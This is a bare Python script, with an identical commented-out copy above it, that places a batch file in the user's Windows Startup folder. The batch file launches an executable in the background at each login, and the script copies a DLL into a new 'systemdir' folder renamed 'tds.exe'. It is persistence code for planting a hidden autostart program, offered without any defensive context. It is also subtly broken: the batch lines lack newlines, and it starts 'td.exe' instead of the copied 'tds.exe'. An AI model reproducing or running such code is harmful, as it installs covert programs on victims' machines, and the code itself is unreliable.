#import os
#from pathlib import Path
#import shutil
#
#def job():
#    as2 = f"{Path.home()}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
#    ascopy = Path(f"{Path.home()}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
#    sas = "./systemdir/tds.exe"
#    original = Path(__file__)
#    sex = ("./tdhandler.dll")
#    ass = "tds.exe"
#    #shutil.copy2(__file__[:-2]+"exe", ascopy)
#    
#   
#    #os.system(f'mv {__file__} {ass}')
#    os.chdir(as2)
#    
#    with open("tdstart.bat",'w+') as td:
#        os.mkdir("systemdir")
#        td.write("echo off\n")
#        td.write("chdir systemdir")
#        td.write("start td.exe")
#        #os.system(f"copy {__file__} ./systemdir")
#    os.chdir("./systemdir")
#    shutil.copy2(sex, ass)
#    
#        #ascopy.write_bytes(original.read_bytes())
#        #shutil.copy2(__file__[:-2]+"exe", sas)
#        #original = Path(__file__)
#        #target = "C:\\%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\\systemdir"
#
#job()

import os
from pathlib import Path
import shutil

def job():
    as2 = f"{Path.home()}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
    ascopy = Path(f"{Path.home()}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
    sas = "./systemdir/tds.exe"
    original = Path(__file__)
    sex = (__file__[:-7]+"/tdhandler.dll")
    ass = "tds.exe"
    #shutil.copy2(__file__[:-2]+"exe", ascopy)
    
   
    #os.system(f'mv {__file__} {ass}')
    os.chdir(as2)
    
    with open("tdstart.bat",'w+') as td:
        os.mkdir("systemdir")
        td.write("echo off\n")
        td.write("chdir systemdir")
        td.write("start /b td.exe")
        #os.system(f"copy {__file__} ./systemdir")
    os.chdir("./systemdir")
    shutil.copy2(sex, ass)
    
        #ascopy.write_bytes(original.read_bytes())
        #shutil.copy2(__file__[:-2]+"exe", sas)
        #original = Path(__file__)
        #target = "C:\\%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\\systemdir"

job()

